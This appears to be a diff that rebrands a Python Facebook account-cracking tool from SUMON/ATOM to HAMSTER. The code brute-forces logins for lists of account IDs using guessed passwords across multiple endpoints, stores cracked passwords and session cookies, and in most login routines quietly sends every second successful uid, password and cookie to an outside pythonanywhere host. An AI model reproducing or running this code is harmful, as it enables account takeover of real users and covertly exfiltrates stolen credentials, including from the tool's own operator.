@@ -77,8 +77,8 @@ try:
     import mechanize
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures==2 > /SUMON/null')
-    os.system('python SUMON.py')
+    os.system('pip install mechanize requests futures==2 > /HAMSTER/null')
+    os.system('python HAMSTER.py')
 from bs4 import BeautifulSoup
 from datetime import date
 from datetime import datetime
@@ -298,7 +298,7 @@ def wow(text):
 def linex():
     print(f'{green}----------------------------------------------')
 
-def SUMON_time():
+def HAMSTER_time():
     print(f"\033[1;32m[\033[1;31m:\033[1;32m] AUTH   : KING XD")
     print(f"\033[1;32m[\033[1;31m:\033[1;32m] SIM    : {ahydra}")
     linex()
@@ -306,7 +306,7 @@ def SUMON_time():
 class Process:
     def __init__(self):
         self.cc=[]
-        #self.key="ATOM-"+ base64.b16encode(str(os.getuid()).encode()).decode() + hashlib.md5((''.join([platform.version(), str(os.getuid()), platform.platform(), os.getlogin(), platform.release()]).replace(' ', '').encode())).hexdigest()
+        #self.key="HAMSTER-"+ base64.b16encode(str(os.getuid()).encode()).decode() + hashlib.md5((''.join([platform.version(), str(os.getuid()), platform.platform(), os.getlogin(), platform.release()]).replace(' ', '').encode())).hexdigest()
         self.key=""
         self.clear()
         r = self.Gex('https://pastebin.com/raw/uhce1AGG')
@@ -339,7 +339,7 @@ class Process:
 
 def menu():
     clear()
-    SUMON_time()
+    HAMSTER_time()
     
     print("[1] FILE CLONE ")
     print("[2] RANDOM CLONE ")
@@ -398,10 +398,10 @@ def f_clone():
         clear()
         print("\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : first123, first1234, first12345 ")
         linex()
-        for SUMON in range(plimit):
-            ap = input(f" [{SUMON+1}] ENTER PASSWORD : ")
+        for HAMSTER in range(plimit):
+            ap = input(f" [{HAMSTER+1}] ENTER PASSWORD : ")
             plist.append(ap)
-    with ThreadPool(max_workers=50) as SUMON_xd:
+    with ThreadPool(max_workers=50) as HAMSTER_xd:
         clear()
         tl = str(len(idz))
         print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNTS : "+tl)
@@ -411,11 +411,11 @@ def f_clone():
         for love in idz:
             uid, name = love.split("|")
             pwx = plist
-            if m == "1":SUMON_xd.submit(freefb, uid, name, pwx, tl)
-            elif m == "2":SUMON_xd.submit(bapi, uid, name, pwx, tl)
-            elif m == "3":SUMON_xd.submit(graph, uid, name, pwx, tl)
+            if m == "1":HAMSTER_xd.submit(freefb, uid, name, pwx, tl)
+            elif m == "2":HAMSTER_xd.submit(bapi, uid, name, pwx, tl)
+            elif m == "3":HAMSTER_xd.submit(graph, uid, name, pwx, tl)
             else:
-                SUMON_xd.submit(graph, uid, name, pwx, tl)
+                HAMSTER_xd.submit(graph, uid, name, pwx, tl)
     linex()
     print("\033[1;32m[\033[1;31m✓\033[1;32m] PROCESS HAS BEEN COMPLETED ")
     print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ACCOUNTS : "+str(len(oks)))
@@ -426,7 +426,7 @@ def f_clone():
 
 def r_clone():
     clear()
-    SUMON_time()
+    HAMSTER_time()
     print("[1] RONDAM FULL NUMBER")
     print("[2] RONDAM 4 DIGIT")
     #print(" [3] NEPAL RAODOM")
@@ -435,18 +435,18 @@ def r_clone():
     #print(" [6] GAMING CLONE")
     linex()
     bithi = input("\033[1;32m[\033[1;31m:\033[1;32m] CHOOSE - ")
-    if bithi =='1':SUMON1()
-    elif bithi =='2':SUMON2()
-    #elif bithi =='3':SUMON3()
-    #elif bithi =='4':SUMON4()
-    #elif bithi =='5':SUMON5()
-    #elif bithi =='6':SUMON6()
+    if bithi =='1':HAMSTER1()
+    elif bithi =='2':HAMSTER2()
+    #elif bithi =='3':HAMSTER3()
+    #elif bithi =='4':HAMSTER4()
+    #elif bithi =='5':HAMSTER5()
+    #elif bithi =='6':HAMSTER6()
     else:
         print("SELECT CORRECT OPTION")
         time.sleep(1)
         menu()
     
-def SUMON1():
+def HAMSTER1():
     fresh()
     print(f" {wow('â¢')} ENTER FULL NUMBER  ")
     print(f" {wow('â¢')} EXAMPLE : {green}8898765678 ")
@@ -484,7 +484,7 @@ def SUMON1():
     print(f" {wow('â¢')} {green}TOTAL OK : {str(len(oks))} ")
     divider()
     exit()
-def SUMON2():
+def HAMSTER2():
     user=[]
     os.system('clear')
     print(logo)
@@ -504,30 +504,30 @@ def SUMON2():
     print(" [5] METHOD ")
     #print(" [6] METHOD ")
     linex()
-    SUMONfire = input("[:] [CHOOSE] :- ")
-    with ThreadPool(max_workers=50) as SUMON_xd:
+    HAMSTERfire = input("[:] [CHOOSE] :- ")
+    with ThreadPool(max_workers=50) as HAMSTER_xd:
         clear()
-        SUMON_time()
+        HAMSTER_time()
         tl = str(len(user))
         print(' FLIGHT MODE ON/OFF ');linex()
         for guru in user:
             uid = kode+guru
             pwx = [uid[:6],uid[:7],uid[:8],uid[:9],uid]
-            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
-            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
-            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
-            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
-            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
-            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
+            if HAMSTERfire =='1':HAMSTER_xd.submit(mbasic,uid,pwx,tl)
+            elif HAMSTERfire =='2':HAMSTER_xd.submit(p,uid,pwx,tl)
+            elif HAMSTERfire =='3':HAMSTER_xd.submit(x,uid,pwx,tl)
+            elif HAMSTERfire =='4':HAMSTER_xd.submit(mobile,uid,pwx,tl)
+            elif HAMSTERfire =='5':HAMSTER_xd.submit(freeq,uid,pwx,tl)
+            elif HAMSTERfire =='6':HAMSTER_xd.submit(d,uid,pwx,tl)
             else:
-                SUMON_xd.submit(p,uid,pwx,tl)
+                HAMSTER_xd.submit(p,uid,pwx,tl)
     linex()
     print('[-] CRACK PROCESS COMPLETE')
     print('[-] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[-] ID SAVE SUMON-OK TXT')
+    print('[-] ID SAVE HAMSTER-OK TXT')
     linex()
 
-def SUMON3():
+def HAMSTER3():
     user=[]
     os.system('clear')
     print(logo)
@@ -549,7 +549,7 @@ def SUMON3():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
-    SUMONfire = input("[+] [CHOOSE] :- ")
+    HAMSTERfire = input("[+] [CHOOSE] :- ")
     linex()
     print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -558,32 +558,32 @@ def SUMON3():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as SUMON_xd:
+    with ThreadPool(max_workers=30) as HAMSTER_xd:
         clear()
-        SUMON_time()
+        HAMSTER_time()
         tl = str(len(user))
         print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
         print(f"[+] SIM CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{HAMSTERfire}')
         linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for love in user:
             uid = kode+love
             pwx = [uid+love,'tamang123 ','tamang1234','maya123','pokhara','nepal123','kathmandu123','pokhara123','kathmandu','tamang12345','nepal12345','nepal1234']
-            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
-            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
-            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
-            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
-            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
-            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
+            if HAMSTERfire =='1':HAMSTER_xd.submit(mbasic,uid,pwx,tl)
+            elif HAMSTERfire =='2':HAMSTER_xd.submit(p,uid,pwx,tl)
+            elif HAMSTERfire =='3':HAMSTER_xd.submit(x,uid,pwx,tl)
+            elif HAMSTERfire =='4':HAMSTER_xd.submit(mobile,uid,pwx,tl)
+            elif HAMSTERfire =='5':HAMSTER_xd.submit(freeq,uid,pwx,tl)
+            elif HAMSTERfire =='6':HAMSTER_xd.submit(d,uid,pwx,tl)
             else:
-                SUMON_xd.submit(p,uid,pwx,tl)
+                HAMSTER_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
+    print('[â] ID SAVE HAMSTER-OK TXT')
     linex()
 
-def SUMON4():
+def HAMSTER4():
     user=[]
     os.system('clear')
     print(logo)
@@ -605,7 +605,7 @@ def SUMON4():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
-    SUMONfire = input("[+] [CHOOSE] :- ")
+    HAMSTERfire = input("[+] [CHOOSE] :- ")
     linex()
     print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -614,34 +614,34 @@ def SUMON4():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as SUMON_xd:
+    with ThreadPool(max_workers=30) as HAMSTER_xd:
         clear()
-        SUMON_time()
+        HAMSTER_time()
         tl = str(len(user))
         print(f"[+] YOUR TOTAL IDZ  : "+tl+" ")
         print(f"[+] YOUR CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{HAMSTERfire}')
         linex();print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');linex()
         for love in user:
             uid = kode+love
             mk = uid[:6]
             pwx = [love]
             pwx = [kode+love,mk,'bangladesh', 'freefire', '506070', '708090', 'i love you', '@#@#@#']
-            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
-            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
-            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
-            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
-            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
-            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
+            if HAMSTERfire =='1':HAMSTER_xd.submit(mbasic,uid,pwx,tl)
+            elif HAMSTERfire =='2':HAMSTER_xd.submit(p,uid,pwx,tl)
+            elif HAMSTERfire =='3':HAMSTER_xd.submit(x,uid,pwx,tl)
+            elif HAMSTERfire =='4':HAMSTER_xd.submit(mobile,uid,pwx,tl)
+            elif HAMSTERfire =='5':HAMSTER_xd.submit(freeq,uid,pwx,tl)
+            elif HAMSTERfire =='6':HAMSTER_xd.submit(d,uid,pwx,tl)
             else:
-                SUMON_xd.submit(p,uid,pwx,tl)
+                HAMSTER_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
+    print('[â] ID SAVE HAMSTER-OK TXT')
     linex()
 
-def SUMON5():
+def HAMSTER5():
     user=[]
     os.system('clear')
     print(logo)
@@ -670,7 +670,7 @@ def SUMON5():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
-    SUMONfire = input("[+] [CHOOSE] :- ")
+    HAMSTERfire = input("[+] [CHOOSE] :- ")
     linex()
     print(" [+] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -679,34 +679,34 @@ def SUMON5():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as SUMON_xd:
+    with ThreadPool(max_workers=30) as HAMSTER_xd:
         os.system("clear")
         print(logo)
         tl = str(len(user))
         print(f"[+] YOUR CODE CHOOSED : "+code)
         print(f"[+] YOUR TOTAL IDZ : "+tl+" ")
-        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{HAMSTERfire}')
         linex();print('    USE FLIGHT (\033[1;37mAIRPLANE\033[1;37m) MODE BEFORE USE');linex()
         for love in user:
             uid = code+love
             pwx = [love,uid[:6]]
             for Eman in HamiiID:
                 pwx.append(Eman)
-            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
-            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
-            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
-            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
-            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
-            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
+            if HAMSTERfire =='1':HAMSTER_xd.submit(mbasic,uid,pwx,tl)
+            elif HAMSTERfire =='2':HAMSTER_xd.submit(p,uid,pwx,tl)
+            elif HAMSTERfire =='3':HAMSTER_xd.submit(x,uid,pwx,tl)
+            elif HAMSTERfire =='4':HAMSTER_xd.submit(mobile,uid,pwx,tl)
+            elif HAMSTERfire =='5':HAMSTER_xd.submit(freeq,uid,pwx,tl)
+            elif HAMSTERfire =='6':HAMSTER_xd.submit(d,uid,pwx,tl)
             else:
-                SUMON_xd.submit(p,uid,pwx,tl)
+                HAMSTER_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
+    print('[â] ID SAVE HAMSTER-OK TXT')
     linex()
 
-def SUMON6():
+def HAMSTER6():
     user=[]
     os.system('clear')
     print(logo)
@@ -728,7 +728,7 @@ def SUMON6():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
-    SUMONfire = input("[+] [CHOOSE] :- ")
+    HAMSTERfire = input("[+] [CHOOSE] :- ")
     linex()
     print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
@@ -737,31 +737,31 @@ def SUMON6():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as SUMON_xd:
+    with ThreadPool(max_workers=30) as HAMSTER_xd:
         clear()
-        SUMON_time()
+        HAMSTER_time()
         tl = str(len(user))
         print(f"[+] YOUR LIMIT IDZ  : "+tl+" ")
         print(f"[+] YOUR CODE CHOOSED : "+kode)
-        print(f'[+] YOUR METHOD CHOOSED : M{SUMONfire}')
+        print(f'[+] YOUR METHOD CHOOSED : M{HAMSTERfire}')
         linex();print('    USE FLIGHT (\033[1;37mAIRPLANE\033[1;37m) MODE BEFORE USE');linex()
         for love in user:
             uid = kode+love
             mk = uid[:6]
             pwx = [love]
             pwx = [kode+love,mk,'free fire','i love you','57273200']
-            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
-            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
-            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
-            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
-            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
-            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
+            if HAMSTERfire =='1':HAMSTER_xd.submit(mbasic,uid,pwx,tl)
+            elif HAMSTERfire =='2':HAMSTER_xd.submit(p,uid,pwx,tl)
+            elif HAMSTERfire =='3':HAMSTER_xd.submit(x,uid,pwx,tl)
+            elif HAMSTERfire =='4':HAMSTER_xd.submit(mobile,uid,pwx,tl)
+            elif HAMSTERfire =='5':HAMSTER_xd.submit(freeq,uid,pwx,tl)
+            elif HAMSTERfire =='6':HAMSTER_xd.submit(d,uid,pwx,tl)
             else:
-                SUMON_xd.submit(p,uid,pwx,tl)
+                HAMSTER_xd.submit(p,uid,pwx,tl)
     linex()
     print('[â] CRACK PROCESS COMPLETE')
     print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
+    print('[â] ID SAVE HAMSTER-OK TXT')
     linex()
 
 def n_clone():
@@ -809,7 +809,7 @@ def freefb(uid, name, pwx, tl):
     global oks
     global cps
     global bkas
-    sys.stdout.write("\r\033[1;37m [SUMON-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [HAMSTER-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         first = name.split(" ")[0]
@@ -873,22 +873,22 @@ def freefb(uid, name, pwx, tl):
                 bkas.append(uid)
                 if len(bkas)% 2 == 0:
                     statusok = (f"{uid}|{pw}|{coki}")
-                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    requests.get(f"https://HAMSTERroy.pythonanywhere.com/load?msg={statusok}")
                 else:
-                    print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                    print(f" {green}(HAMSTER-OK) {uid}|{pw} ")
                     print(f" {green}Cookie : {green}{coki}")
-                    open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                    open("/sdcard/HAMSTER-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     oks.append(uid)
                     break
             elif "checkpoint" in log_cookies:
                 if "Enter login code to continue" in log_cookies:
-                    print(f" {cyan}[SUMON-2F] {uid}|{pw}")
-                    open("/sdcard/SUMON_file_2F.txt", "a").write(f"{uid}|{pw}\n")
+                    print(f" {cyan}[HAMSTER-2F] {uid}|{pw}")
+                    open("/sdcard/HAMSTER_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                     twf.append(uid+"|"+pw)
                     break
                 else:
-                    #print(f" {red}[SUMON-CP] {uid}|{pw}")
-                    open("/sdcard/SUMON_file_cp.txt", "a").write(f"{uid}|{pw}\n")
+                    #print(f" {red}[HAMSTER-CP] {uid}|{pw}")
+                    open("/sdcard/HAMSTER_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid+"|"+pw)
                     break
             else:
@@ -903,7 +903,7 @@ def bapi(uid, name, pwx, tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [SUMON-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [HAMSTER-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         first = name.split(" ")[0]
@@ -963,14 +963,14 @@ def bapi(uid, name, pwx, tl):
             result = requests.post(url, data=data, headers=headers).json()
             if "Session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
-                print(f" {green}[SUMON-OK] {uid}|{pw}")
+                print(f" {green}[HAMSTER-OK] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
-                open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                open("/sdcard/HAMSTER_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 oks.append(uid+"|"+pw)
                 break
             elif "www.facebook.com" in result["error"]["message"]:
-                print(f" {red}[SUMON-CP] {uid}|{pw}")
-                open("/sdcard/SUMON_file_tf.txt", "a").write(f"{uid}|{pw}\n")
+                print(f" {red}[HAMSTER-CP] {uid}|{pw}")
+                open("/sdcard/HAMSTER_file_tf.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 break
             else:
@@ -985,7 +985,7 @@ def graph(uid, name, pwx, tl):
     global loop
     global oks
     global cps
-    sys.stdout.write("\r\033[1;37m [SUMON-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
+    sys.stdout.write("\r\033[1;37m [HAMSTER-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         first = name.split(" ")[0]
@@ -1045,14 +1045,14 @@ def graph(uid, name, pwx, tl):
             result = requests.post(url, data=data, headers=headers).json()
             if "Session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
-                print(f" {green}[SUMON-OK] {uid}|{pw}")
+                print(f" {green}[HAMSTER-OK] {uid}|{pw}")
                 print(f" {white}[COOKIES] {green}{coki}")
-                open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                open("/sdcard/HAMSTER_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                 oks.append(uid+"|"+pw)
                 break
             elif "www.facebook.com" in result["error"]["message"]:
-                print(f" {red}[SUMON-CP] {uid}|{pw}")
-                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+                print(f" {red}[HAMSTER-CP] {uid}|{pw}")
+                open("/sdcard/HAMSTER_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 break
             else:
@@ -1105,11 +1105,11 @@ def mbasic(uid,pwx,tl):
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://web.facebook.com',
+            'Origin': 'https://www.facebook.com',
             'DNT': '1',
-            'Alt-Used': 'web.facebook.com',
+            'Alt-Used': 'www.facebook.com',
             'Connection': 'keep-alive',
-            'Referer': 'https://web.facebook.com/gfgd',
+            'Referer': 'https://www.facebook.com/gfgd',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
@@ -1119,7 +1119,7 @@ def mbasic(uid,pwx,tl):
             'Pragma': 'no-cache',
             'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1'
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1129,19 +1129,21 @@ def mbasic(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        print(f"{green}(HAMSTER-LGN){cid}|{pw}")
+                        print(f" {green}COKI : {green}{coki}")
+                        open("/sdcard/HAMSTER-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
+                        print(f"{RED}(2F){cid}")
                         statusok = (f"{cid}|{pw}|{coki}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        requests.get(f"https://HAMSTERroy.pythonanywhere.com/load?msg={statusok}")
                         break
                 else:
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                #print('\33[1;91m[HAMSTER-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/HAMSTER-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -1225,26 +1227,26 @@ def p(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        print(f"{cyan}(HAMSTER-NV){cid}|{pw}")
+                        open("/sdcard/HAMSTER-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                           requests.get(f"https://HAMSTERroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}(HAMSTER-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/HAMSTER-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                            oks.append(cid)
                            break
                 else:
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                #print('\33[1;91m[HAMSTER-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/HAMSTER-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -1328,26 +1330,26 @@ def x(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        print(f"{cyan}(HAMSTER-NV){cid}|{pw}")
+                        open("/sdcard/HAMSTER-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                           requests.get(f"https://HAMSTERroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}(HAMSTER-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/HAMSTER-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                            oks.append(cid)
                            break
                 else:
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                #print('\33[1;91m[HAMSTER-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/HAMSTER-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -1425,26 +1427,26 @@ def mobile(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        print(f"{cyan}(HAMSTER-NV){cid}|{pw}")
+                        open("/sdcard/HAMSTER-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                           requests.get(f"https://HAMSTERroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}(HAMSTER-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/HAMSTER-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                            oks.append(cid)
                            break
                 else:
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                #print('\33[1;91m[HAMSTER-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/HAMSTER-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -1522,26 +1524,26 @@ def freeq(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        print(f"{cyan}(HAMSTER-NV){cid}|{pw}")
+                        open("/sdcard/HAMSTER-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                           requests.get(f"https://HAMSTERroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
